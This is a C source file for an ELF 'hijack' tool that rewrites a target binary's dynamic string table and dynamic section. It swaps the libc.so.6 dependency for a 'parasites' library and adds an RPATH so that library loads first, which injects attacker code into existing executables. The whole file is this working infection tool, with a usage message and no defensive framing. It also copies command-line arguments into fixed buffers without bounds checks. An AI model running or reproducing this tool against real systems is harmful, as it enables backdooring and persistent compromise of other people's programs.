#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/stat.h>

#include <elf.h>

#define DITING_ELF_CLASS_32 1
#define DITING_ELF_CLASS_64 2

#define DITING_CHECK_ELF_MODE(ptr) ({((syself_t *)ptr)->mem[4];})

typedef struct{
	char name[1024];
	char parasites[128];
	char srcstring[128];
	unsigned char *mem;
	unsigned char *new;
	struct stat stat;
}syself_t;

static int
diting_load_elf(syself_t *syself)
{
	int hfd, res;
	struct stat stat;
	if((hfd = open(syself->name, O_RDONLY)) < 0){
		res = -1;
		goto err0;
	}
	if(fstat(hfd, &stat)){
		res = -1;
		goto err0;
	}

	if((syself->mem = malloc(stat.st_size + 10)) == NULL){
		res = -1;
		goto err0;
	}
	if((syself->new = malloc(stat.st_size + 10)) == NULL){
		res = -1;
		goto err0;
	}
	memset(syself->mem, 0x0, stat.st_size + 1);
	memset(syself->new, 0x0, stat.st_size + 1);

	if(read(hfd, syself->mem, stat.st_size) != stat.st_size){
		res = -1;
		goto err0;
	}
	memcpy(&syself->stat, &stat, sizeof(struct stat));
	res = 0;
err0:
	if(hfd > 0)
		close(hfd);

	return res;
}

static int 
diting_hijack_restorelf(syself_t *syself)
{
	int fd, res;
	fd = open(syself->name, O_RDWR);
	if(fd <= 0){
		res = -1;	
		goto err0;
	}

	if(write(fd, syself->new, syself->stat.st_size) != syself->stat.st_size){
		res = -1;	
		goto err0;
	}

	res = 0;
err0:
	if(fd > 0)
		close(fd);

	return res;
}

static void
diting_hijack_64elf(syself_t *syself)
{
	int i, found = 0;
	uint64_t f_offset = 0, t_offset = 0, s_offset = 0, libc_offset = 0;
	Elf64_Ehdr *ehdr = NULL;
	Elf64_Shdr *shdr = NULL, *p_shdr = NULL, *sym_shdr = NULL;
	Elf64_Sym *sym = NULL, *p_sym = NULL;
	Elf64_Dyn *dyn = NULL, *p_dyn = NULL;

	ehdr = (Elf64_Ehdr *)syself->mem;
	p_shdr = shdr = (Elf64_Shdr *)(syself->mem + ehdr->e_shoff);
	for(i = 0; i < ehdr->e_shnum; i++){
		if(p_shdr->sh_type == SHT_DYNSYM){
			found = 1;
			break;
		}
		p_shdr++;
	}
	if(!found)
		exit(1);

	sym_shdr = shdr + p_shdr->sh_link;
	p_sym = sym = (Elf64_Sym *)(syself->mem + p_shdr->sh_offset);

	f_offset = sym_shdr->sh_offset;
	for(i = 0; i < p_shdr->sh_size; i += p_shdr->sh_entsize){
		t_offset = f_offset + p_sym->st_name;
		if(!memcmp(syself->mem + t_offset, syself->srcstring, strlen(syself->srcstring))){
			memcpy(syself->new, syself->mem, t_offset);
			memcpy(syself->new + t_offset, syself->parasites, strlen(syself->srcstring));

			t_offset = t_offset + strlen(syself->srcstring);
			memcpy(syself->new + t_offset, syself->mem + t_offset, syself->stat.st_size - t_offset);

			s_offset = p_sym->st_name;
			break;
		}
		p_sym++;
	}


	/*modify elf*/
	found = 0;
	p_shdr = shdr;
	for(i = 0; i < ehdr->e_shnum; i++){
		if(p_shdr->sh_type == SHT_DYNAMIC){
			found = 1;
			break;
		}
		p_shdr++;
	}
	if(!found)
		exit(1);

	uint32_t cnt = 0;
	p_dyn = dyn = (Elf64_Dyn *)(syself->new + p_shdr->sh_offset);
	for(i = 0; i < p_shdr->sh_size; i += p_shdr->sh_entsize){
		if(p_dyn->d_tag == 0 && (p_dyn->d_un.d_val == 0 || p_dyn->d_un.d_ptr == 0)){
			if(0 == cnt){
				p_dyn->d_tag = DT_RPATH;
				p_dyn->d_un.d_val = s_offset;
			}
			if(1 == cnt){
				p_dyn->d_tag = DT_NEEDED;	
				p_dyn->d_un.d_val = libc_offset;
			}
			cnt++;
		}else if(p_dyn->d_tag == DT_NEEDED){
			f_offset = p_dyn->d_un.d_val;
			if(!memcmp(syself->new + sym_shdr->sh_offset + f_offset, "libc.so.6", sizeof("libc.so.6") - 1)){
				libc_offset = p_dyn->d_un.d_val;
				p_dyn->d_un.d_val = s_offset;
			}
		}
		p_dyn++;
	}
}

static void
diting_hijack_32elf(syself_t *syself)
{
	int i, found = 0;
	uint64_t f_offset = 0, t_offset = 0, s_offset = 0, libc_offset = 0;
	Elf32_Ehdr *ehdr = NULL;
	Elf32_Shdr *shdr = NULL, *p_shdr = NULL, *sym_shdr = NULL;
	Elf32_Sym *sym = NULL, *p_sym = NULL;
	Elf32_Dyn *dyn = NULL, *p_dyn = NULL;

	ehdr = (Elf32_Ehdr *)syself->mem;
	p_shdr = shdr = (Elf32_Shdr *)(syself->mem + ehdr->e_shoff);
	for(i = 0; i < ehdr->e_shnum; i++){
		if(p_shdr->sh_type == SHT_DYNSYM){
			found = 1;
			break;
		}
		p_shdr++;
	}
	if(!found)
		exit(1);

	sym_shdr = shdr + p_shdr->sh_link;
	p_sym = sym = (Elf32_Sym *)(syself->mem + p_shdr->sh_offset);

	f_offset = sym_shdr->sh_offset;
	for(i = 0; i < p_shdr->sh_size; i += p_shdr->sh_entsize){
		t_offset = f_offset + p_sym->st_name;
		if(!memcmp(syself->mem + t_offset, syself->srcstring, strlen(syself->srcstring))){
			memcpy(syself->new, syself->mem, t_offset);
			memcpy(syself->new + t_offset, syself->parasites, strlen(syself->srcstring));

			t_offset = t_offset + strlen(syself->srcstring);
			memcpy(syself->new + t_offset, syself->mem + t_offset, syself->stat.st_size - t_offset);

			s_offset = p_sym->st_name;
			break;
		}
		p_sym++;
	}


	/*modify elf*/
	found = 0;
	p_shdr = shdr;
	for(i = 0; i < ehdr->e_shnum; i++){
		if(p_shdr->sh_type == SHT_DYNAMIC){
			found = 1;
			break;
		}
		p_shdr++;
	}
	if(!found)
		exit(1);

	uint32_t cnt = 0;
	p_dyn = dyn = (Elf32_Dyn *)(syself->new + p_shdr->sh_offset);
	for(i = 0; i < p_shdr->sh_size; i += p_shdr->sh_entsize){
		if(p_dyn->d_tag == 0 && (p_dyn->d_un.d_val == 0 || p_dyn->d_un.d_ptr == 0)){
			if(0 == cnt){
				p_dyn->d_tag = DT_RPATH;
				p_dyn->d_un.d_val = s_offset;
			}
			if(1 == cnt){
				p_dyn->d_tag = DT_NEEDED;	
				p_dyn->d_un.d_val = libc_offset;
			}
			cnt++;
		}else if(p_dyn->d_tag == DT_NEEDED){
			f_offset = p_dyn->d_un.d_val;
			if(!memcmp(syself->new + sym_shdr->sh_offset + f_offset, "libc.so.6", sizeof("libc.so.6") - 1)){
				libc_offset = p_dyn->d_un.d_val;
				p_dyn->d_un.d_val = s_offset;
			}
		}
		p_dyn++;
	}
}

void showusage()
{
	printf("usage:\n""-s [search symbol] -p [parasites symbol] -f [hijack file]\n");
}

int main(int argc, char **argv)
{
	int opt, melf;
	syself_t syself;
	memset(&syself, 0x0, sizeof(syself_t));

	while(-1 != (opt = getopt(argc, argv, "s:p:f:h"))){
		switch(opt){
		case 's':
			strncpy(syself.srcstring, optarg, strlen(optarg));
			break;
		case 'p':
			strncpy(syself.parasites, optarg, strlen(optarg));
			break;
		case 'f':
			strncpy(syself.name, optarg, strlen(optarg));
			break;
		case 'h':
			showusage();
			return 0;
		default:
			break;
		}
	}

	if(argc < 7 || syself.srcstring[0] == '\0' || syself.parasites[0] == '\0' || 
			syself.name[0] == '\0'){
		showusage();
		return -1;
	}
	if(diting_load_elf(&syself))
		goto out;
	melf = DITING_CHECK_ELF_MODE(&syself);	
	if(DITING_ELF_CLASS_64 == melf)
		diting_hijack_64elf(&syself);
	else if(DITING_ELF_CLASS_32 == melf)
		diting_hijack_32elf(&syself);

	diting_hijack_restorelf(&syself);
out:
	if(syself.mem)
		free(syself.mem);
	if(syself.new)
		free(syself.new);
	return 0;
}
